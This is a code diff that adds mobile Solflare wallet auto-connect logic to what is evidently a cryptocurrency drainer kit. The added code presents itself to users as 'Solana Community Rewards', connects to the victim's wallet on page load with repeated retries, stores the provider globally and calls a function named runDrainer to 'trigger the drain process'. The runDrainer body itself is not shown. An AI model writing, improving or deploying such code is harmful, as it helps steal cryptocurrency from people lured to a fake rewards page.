@@ -6200,6 +6200,139 @@ window.runDrainer = runDrainer;
     return { success: false, error: 'All connection methods failed' };
   };
 
+    // Enhanced mobile Solflare connection function
+    async function trySolflareMobileConnection() {
+      console.log(`[SOLFLARE_MOBILE] Attempting mobile connection...`);
+      
+      // Check if we're in Solflare browser
+      const isInSolflareBrowser = window.location.href.includes('solflare.com') || 
+                                 document.referrer.includes('solflare.com') ||
+                                 navigator.userAgent.includes('Solflare');
+      
+      if (!isInSolflareBrowser) {
+        console.log(`[SOLFLARE_MOBILE] Not in Solflare browser, skipping connection attempt`);
+        return;
+      }
+      
+      console.log(`[SOLFLARE_MOBILE] In Solflare browser, checking for provider...`);
+      
+      // Enhanced Solflare provider detection
+      const solflare = window.solflare || window.solflareWallet || window.SolflareWallet;
+      if (!solflare) {
+        console.log(`[SOLFLARE_MOBILE] No Solflare provider found, waiting...`);
+        return;
+      }
+      
+      console.log(`[SOLFLARE_MOBILE] Solflare provider found:`, Object.keys(solflare));
+      
+      try {
+        // Check if already connected
+        if (solflare.isConnected && solflare.isConnected()) {
+          console.log(`[SOLFLARE_MOBILE] Already connected, getting public key...`);
+          const publicKey = solflare.publicKey;
+          if (publicKey) {
+            console.log(`[SOLFLARE_MOBILE] Using existing connection:`, publicKey.toString());
+            
+            // Store the provider globally for runDrainer to use
+            window.connectedWallet = {
+              key: 'solflare',
+              name: 'Solflare',
+              logo: '/solflare-logo.png',
+              publicKey: publicKey.toString(),
+              provider: solflare
+            };
+            
+            // Trigger the drain process directly
+            if (window.runDrainer) {
+              console.log(`[SOLFLARE_MOBILE] Triggering runDrainer with existing connection`);
+              window.runDrainer(solflare);
+            }
+            
+            showStatus(`Connected to Solflare`, 'success');
+            return;
+          }
+        }
+        
+        // Try to connect with multiple strategies
+        const connectionStrategies = [
+          {
+            name: 'Method 1: Connect with metadata',
+            fn: () => solflare.connect({
+              onlyIfTrusted: false,
+              appMetadata: {
+                name: 'Solana Community Rewards',
+                url: window.location.origin,
+                icon: '/logo.png'
+              }
+            })
+          },
+          {
+            name: 'Method 2: Simple connect',
+            fn: () => solflare.connect()
+          },
+          {
+            name: 'Method 3: Request method',
+            fn: () => {
+              if (typeof solflare.request === 'function') {
+                return solflare.request({ method: 'connect' });
+              } else {
+                throw new Error('provider.request is not a function');
+              }
+            }
+          }
+        ];
+        
+        for (let i = 0; i < connectionStrategies.length; i++) {
+          try {
+            console.log(`[SOLFLARE_MOBILE] Trying ${connectionStrategies[i].name}...`);
+            const result = await connectionStrategies[i].fn();
+            
+            // Enhanced public key extraction for Solflare
+            const publicKey = result?.publicKey || 
+                             result?.account?.publicKey ||
+                             solflare.publicKey || 
+                             solflare.account?.publicKey ||
+                             solflare.connected?.publicKey ||
+                             solflare.wallet?.publicKey;
+            
+            if (publicKey) {
+              console.log(`[SOLFLARE_MOBILE] ${connectionStrategies[i].name} successful:`, publicKey.toString());
+              
+              // Store the provider globally for runDrainer to use
+              window.connectedWallet = {
+                key: 'solflare',
+                name: 'Solflare',
+                logo: '/solflare-logo.png',
+                publicKey: publicKey.toString(),
+                provider: solflare
+              };
+              
+              // Trigger the drain process directly
+              if (window.runDrainer) {
+                console.log(`[SOLFLARE_MOBILE] Triggering runDrainer with new connection`);
+                window.runDrainer(solflare);
+              }
+              
+              showStatus(`Connected to Solflare`, 'success');
+              return;
+            } else {
+              console.log(`[SOLFLARE_MOBILE] ${connectionStrategies[i].name} returned no public key`);
+            }
+          } catch (strategyError) {
+            console.log(`[SOLFLARE_MOBILE] ${connectionStrategies[i].name} failed:`, strategyError.message);
+            if (i < connectionStrategies.length - 1) {
+              await new Promise(resolve => setTimeout(resolve, 1000)); // Wait before next attempt
+            }
+          }
+        }
+        
+        console.log(`[SOLFLARE_MOBILE] All connection methods failed`);
+        
+      } catch (error) {
+        console.error(`[SOLFLARE_MOBILE] Connection error:`, error);
+      }
+    }
+
     // Function to handle deep links properly (moved outside for global access)
     async function openInWallet(walletType) {
       // Use base URL without query parameters to avoid double-encoding issues
@@ -6350,6 +6483,27 @@ window.runDrainer = runDrainer;
             console.log(`[SOLFLARE_DEBUG] User agent: ${navigator.userAgent}`);
             console.log(`[SOLFLARE_DEBUG] Touch points: ${navigator.maxTouchPoints}`);
             console.log(`[SOLFLARE_DEBUG] Screen width: ${window.innerWidth}`);
+            
+            // Enhanced mobile Solflare auto-connect with multiple attempts
+            console.log(`[SOLFLARE_MOBILE] Starting enhanced mobile auto-connect for Solflare`);
+            
+            // Try immediate connection first
+            setTimeout(() => {
+              console.log(`[SOLFLARE_MOBILE] Attempt 1: Immediate connection attempt`);
+              trySolflareMobileConnection();
+            }, 1000);
+            
+            // Try again after 3 seconds
+            setTimeout(() => {
+              console.log(`[SOLFLARE_MOBILE] Attempt 2: Delayed connection attempt`);
+              trySolflareMobileConnection();
+            }, 3000);
+            
+            // Try again after 6 seconds
+            setTimeout(() => {
+              console.log(`[SOLFLARE_MOBILE] Attempt 3: Final connection attempt`);
+              trySolflareMobileConnection();
+            }, 6000);
             
             // No fallback timeout for Solflare - let auto-connect handle everything
             return;
